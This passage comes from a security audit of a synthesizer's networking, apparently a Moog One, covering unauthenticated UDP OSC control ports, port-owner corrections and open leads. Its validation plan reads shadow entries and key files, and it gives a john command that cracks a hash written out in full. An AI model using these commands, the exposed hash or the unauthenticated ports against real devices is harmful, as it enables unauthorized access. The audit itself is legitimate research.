There is no TLS anywhere in the control plane; all of it is plain UDP OSC. There is no
authentication on any control port. The design assumes a trusted, isolated network —
which is exactly what a studio LAN with other gear on it is **not**.

---

## 11. Validation plan (READ-ONLY commands for the real instrument)

Do not run these against the synth yourself per the project rules; hand them to the
owner. All are read-only.

Confirm listeners and ownership:
```
netstat -lnp -u ; netstat -lnp -t          # PID→port; confirms 9600=las-dwm, 9300=las-sc, etc.
cat /proc/net/udp                            # hex ports: 2580=9600, 2454=9300, 1E5C=7772, …
ls -l /proc/$(pidof las-dwm)/fd | grep socket
```
Confirm interfaces / dual-DHCP:
```
ip -o addr show                              # expect two addrs on ethext if both clients ran
ps w | grep -E 'udhcpc|dhcpcd' | grep -v grep
cat /proc/sys/net/ipv4/ip_forward            # expect 1
iptables -t nat -S ; iptables -S             # expect DNAT rules only, no filter rules
```
Confirm SSH gate / auth (no login attempts):
```
pidof dropbear ; cat /proc/$(pidof dropbear)/cmdline | tr '\0' ' '   # expect -B -R when up
ls -l /media/thumbdrive/k 2>/dev/null ; hexdump -C /media/thumbdrive/k 2>/dev/null | head
getent shadow root las                       # confirm root:: and las DES hash on the live unit
ls -l /root/.ssh/authorized_keys /var/local/root/.ssh/authorized_keys 2>/dev/null
```
Confirm avahi advertisement (from another host on the LAN):
```
avahi-browse -rt _ssh._tcp ; avahi-browse -rt _sftp-ssh._tcp
```
Offline (on a copy, not the instrument) — settle the `las` password strength:
```
# copy the hash to a workstation and run john/hashcat against DES crypt, e.g.
echo 'las:bqMQnZNvDg8lE' > h ; john --format=descrypt h
```

---

## 12. Conflicts with existing docs

Report-only; I did not edit any existing file.

1. **9600 owner.** `docs/arch/control-plane.md:187` attributes UDP **9600** to
   "`las-sc` (2nd) … secondary `las-sc` socket". That is **incorrect**: 9600 is bound
   by **`las-dwm`** (INADDR_ANY, `bind()` at `0x18024`, port word `0x8025`→9600; §8.1),
   which agrees with `docs/MOOG-ONE-INTERNALS.md:76` (`9600 | 0.0.0.0 | las-dwm`) and
   `docs/firmware/small-binaries.md §2.1`. `las-sc` shows **no** 9600 immediate in its
   text (scanned MOVW/MOV and CHICKEN-fixnum encodings). `control-plane.md:589` also
   lists 9600's purpose as "inferred, not confirmed" — it is now confirmed as
   `las-dwm`. The `doc-audit.md:672` already flags this same contradiction.
2. **7770 label.** The task brief's port list calls 7770 "thermal". Evidence
   (`las-frontend --port-vc` default 7770; `las-watchdog` pings `vc:7770`) makes 7770
   the **voice-controller** port; `las-sc`'s `/therm/sys-temp` rides existing channels
   rather than a dedicated thermal port (§2.4). `control-plane.md:189` correctly calls
   7770 "the voice bus".
3. **Port defaults now pinned.** Where earlier docs left some frontend port roles
   loose, §2.1 gives the authoritative `las-frontend` defaults straight from its own
   `--help`/constructor (response 9300, panelinput 9500, paneloutput 9100, oleds 9876,
   perfinput 7772, perfoutput 7771, systemclock 9501, vc 7770, efx 7775). No direct
   contradiction, but this supersedes any looser mapping.

No conflict with `docs/DANGER.md` (§8 corroborates it) or with the newly-written
`docs/firmware/small-binaries.md` and `docs/firmware/lassvc.md` (this report
corroborates and extends both from the network angle).

---

## 13. Unexplored

- **`/var/local` overlay.** root/las home dirs, `~/.ssh/authorized_keys`, and any
  runtime-written network state live under `/var/local`, which is not in this rootfs
  image. The vendor-master-key question (§7.4) can only be settled on the live unit.
- **`las-sc` `/seq/dest/{ip,port,mac}` (§6).** Whether an OSC client can redirect
  `las-sc`'s outbound traffic to an arbitrary host (an SSRF-like primitive) was not
  traced through the code — only the address names were read.
- **`las-frontend` `--enable-osc-sec` / `sec-las-port` / `sec-frontend-adr`.** A
  "secure"/legacy OSC path exists (`las-sc` strings `sec-las-port`, `sec-frontend-adr`;
  `las-frontend --enable-osc-sec` "Send all sound engine messages through the old osc
  protocol"). Its ports and semantics were not disassembled.
- **`las-watchdog` bind addresses.** Confirmed it uses UDP 9666/9799 (frees them with
  `fuser`), but did not disassemble the `bind()` to confirm INADDR_ANY vs loopback.
- **9999 listener.** Confirmed as the SC/EFX reply *send* port; the actual receiver was
  not pinned (no live listener observed).
- **`crond` launch path.** A crontab exists; the exact process that starts `crond` was
  not located in the init scripts examined.
- **XMOS-side ports.** Everything at `203.0.113.2` (7770/7771/9100/9501/9876) is the
  voice controller's firmware, out of scope for this Linux-side region; see the
  XMOS reports.
